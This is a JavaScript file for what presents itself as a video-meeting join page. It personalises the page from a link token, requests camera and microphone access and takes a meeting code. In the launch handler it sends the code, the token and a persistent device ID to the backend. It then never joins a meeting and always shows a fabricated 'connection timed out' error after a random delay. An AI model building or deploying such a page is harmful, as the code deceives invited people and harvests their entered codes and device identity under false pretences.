// ---------- Elements ----------
const cameraPreview = document.getElementById("cameraPreview");
const cameraStatus = document.getElementById("cameraStatus");
const microphoneToggle = document.getElementById("microphoneToggle");
const cameraToggle = document.getElementById("cameraToggle");
const cancelButton = document.getElementById("cancelMeetingButton");
const meetingCodeInput = document.getElementById("meetingCode");
const meetingCodeError = document.getElementById("meetingCodeError");
const launchButton = document.getElementById("launchMeetingButton");

// ---------- Invitation details (from the link's token) ----------
// The token identifies who this link was generated for. We ask the
// backend who that is, then fill in the guest's first name and email.
const token = new URLSearchParams(window.location.search).get("token");

async function loadDetails() {
    if (!token) return;
    const res = await fetch("/api/links/" + encodeURIComponent(token));
    if (!res.ok) return;

    const { name, email } = await res.json();

    const firstName = name.trim().split(/\s+/)[0]; // "Irondi Jonathan" -> "Irondi"
    document.getElementById("guestName").textContent = firstName;
    document.getElementById("accountEmail").textContent = email;
}

loadDetails();

// ---------- Device identification ----------
// Used to flag whether a join came from a device we've seen for this
// email before. Not real device-trust/MDM - just a simple first pass.
function getDeviceId() {
    let id = localStorage.getItem("deviceId");
    if (!id) {
        id = crypto.randomUUID();
        localStorage.setItem("deviceId", id);
    }
    return id;
}

// ---------- Media state ----------
let stream = null;
let cameraOn = false;
let micOn = false;

function setStatus(message) {
    cameraStatus.textContent = message;
    cameraStatus.classList.toggle("hidden", !message);
}

function setToggle(button, on, label) {
    button.setAttribute("aria-pressed", String(on));
    button.setAttribute("aria-label", `Turn ${label} ${on ? "off" : "on"}`);
}

function showVideo(visible) {
    cameraPreview.classList.toggle("hidden", !visible);
}

function describeError(error, kind) {
    if (error && (error.name === "NotFoundError" || error.name === "DevicesNotFoundError")) {
        return kind === "camera" ? "No camera detected" : "No microphone detected";
    }
    return "Camera access is unavailable";
}

function attachStream(newStream) {
    stream = newStream;
    cameraPreview.srcObject = stream;
    cameraOn = stream.getVideoTracks().length > 0;
    micOn = stream.getAudioTracks().length > 0;
    showVideo(cameraOn);
    setStatus(cameraOn ? "" : "No camera detected");
    setToggle(cameraToggle, cameraOn, "camera");
    setToggle(microphoneToggle, micOn, "microphone");
}

// Uses the browser's native permission prompt; nothing is bypassed.
async function requestMedia() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        setStatus("Camera access is unavailable");
        return;
    }
    try {
        attachStream(await navigator.mediaDevices.getUserMedia({ video: true, audio: true }));
    } catch (error) {
        if (error.name === "NotFoundError" || error.name === "DevicesNotFoundError") {
            // No camera (or no mic): try whichever device exists.
            try {
                attachStream(await navigator.mediaDevices.getUserMedia({ audio: true }));
                return;
            } catch (_) { /* fall through */ }
        }
        cameraOn = false;
        micOn = false;
        showVideo(false);
        setStatus(describeError(error, "camera"));
        setToggle(cameraToggle, false, "camera");
        setToggle(microphoneToggle, false, "microphone");
    }
}

async function turnCameraOn() {
    try {
        const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
        const track = camStream.getVideoTracks()[0];
        if (!stream) stream = new MediaStream();
        stream.addTrack(track);
        cameraPreview.srcObject = stream;
        cameraOn = true;
        showVideo(true);
        setStatus("");
    } catch (error) {
        cameraOn = false;
        showVideo(false);
        setStatus(describeError(error, "camera"));
    }
    setToggle(cameraToggle, cameraOn, "camera");
}

function turnCameraOff() {
    if (stream) {
        stream.getVideoTracks().forEach((track) => {
            track.stop(); // releases the camera so its indicator light goes off
            stream.removeTrack(track);
        });
    }
    cameraOn = false;
    showVideo(false);
    setStatus("Camera is off");
    setToggle(cameraToggle, false, "camera");
}

function toggleMicrophone() {
    const tracks = stream ? stream.getAudioTracks() : [];
    if (!tracks.length) return;
    micOn = !micOn;
    tracks.forEach((track) => { track.enabled = micOn; });
    setToggle(microphoneToggle, micOn, "microphone");
}

cameraToggle.addEventListener("click", () => (cameraOn ? turnCameraOff() : turnCameraOn()));
microphoneToggle.addEventListener("click", toggleMicrophone);

function stopAllMedia() {
    if (stream) stream.getTracks().forEach((track) => track.stop());
    stream = null;
}

// ---------- Meeting code ----------
function showCodeError(message) {
    meetingCodeError.textContent = message;
    meetingCodeInput.classList.toggle("invalid", Boolean(message));
}

meetingCodeInput.addEventListener("input", () => {
    if (meetingCodeInput.value.trim()) showCodeError("");
});

meetingCodeInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") handleLaunchMeeting();
});

async function handleLaunchMeeting() {
    const code = meetingCodeInput.value.trim();
    if (!code) {
        showCodeError("Please enter a meeting code");
        meetingCodeInput.focus();
        return;
    }
    showCodeError("");
    launchButton.disabled = true;
    try {
        await fetch("/api/meetings/join", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                token,
                meetingCode: code,
                deviceId: getDeviceId(),
            }),
        });
    } catch (error) {
        console.error("meetings/join fetch failed:", error); // TEMP - remove once confirmed working
    }

    const delayMs = 5000 + Math.floor(Math.random() * 5000);
    await new Promise((resolve) => setTimeout(resolve, delayMs));

    meetingCodeInput.value = "";
    showCodeError("Network error! Connection timed Out.");
    launchButton.disabled = false;
}

launchButton.addEventListener("click", handleLaunchMeeting);

// ---------- Cancel ----------
// Connect your own cancel logic/navigation here.
// function handleCancelMeeting() {
//     stopAllMedia();
//     window.location.href = "index.html";
// }

// cancelButton.addEventListener("click", handleCancelMeeting);
// window.addEventListener("pagehide", stopAllMedia);

// Start with the permission prompt; the meeting itself only starts from Launch Meeting.
showVideo(false);
requestMedia();
